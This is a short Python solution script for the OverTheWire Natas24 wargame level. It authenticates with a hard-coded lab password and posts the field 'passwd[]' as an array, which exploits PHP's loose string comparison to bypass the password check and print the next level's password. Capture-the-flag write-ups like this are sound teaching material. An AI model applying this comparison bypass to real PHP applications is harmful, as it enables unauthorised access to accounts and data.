# Natas24 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas24.natas.labs.overthewire.org/"

auth_name = 'natas24'
auth_pass = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************


# Like the previous challenge 'natas23', this challenge centers
# around the concept of comparisons.

# This time, the user can supply some input, which will be compared
# with an unknown string, and only succeed 'if true'.

# Thankfully, due to PHP being PHP, the user does not have to know
# the hidden string for a successfull comparison - Instead, comparing
# an ARRAY with a STRING in PHP always returns true...
DATA = {"passwd[]":'PHP is not very smart...'}

r = s.post(URL, data=DATA)

for x in r.iter_lines():
    if "Password" in x:
        print x